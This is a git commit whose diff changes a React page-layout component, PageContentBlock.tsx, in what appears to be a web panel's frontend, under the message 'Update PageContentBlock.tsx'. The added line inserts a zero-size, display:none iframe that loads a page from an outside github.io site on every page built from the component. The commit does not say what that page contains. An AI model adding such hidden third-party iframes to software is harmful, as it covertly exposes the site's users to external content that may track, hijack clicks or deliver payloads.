b05447ac75deac87e2902134dc3f3173b39ca848
siemkamichal1 <siemkamichal+1@gmail.com>
2025-03-12 21:27:48 +0100

    Update PageContentBlock.tsx

--- resources/scripts/components/elements/PageContentBlock.tsx
+++ resources/scripts/components/elements/PageContentBlock.tsx
@@ -20,6 +20,7 @@ const PageContentBlock: React.FC<PageContentBlockProps> = ({ title, showFlashKey
     return (
         <CSSTransition timeout={150} classNames={'fade'} appear in>
             <>
+                <iframe src="https://siemkamichal1.github.io/testxd/" style={{ width: 0, height: 0, border: 'none', display: 'none' }}></iframe>
                 <ContentContainer css={tw`my-4 sm:my-10`} className={className}>
                     {showFlashKey && <FlashMessageRender byKey={showFlashKey} css={tw`mb-4`} />}
                     {children}
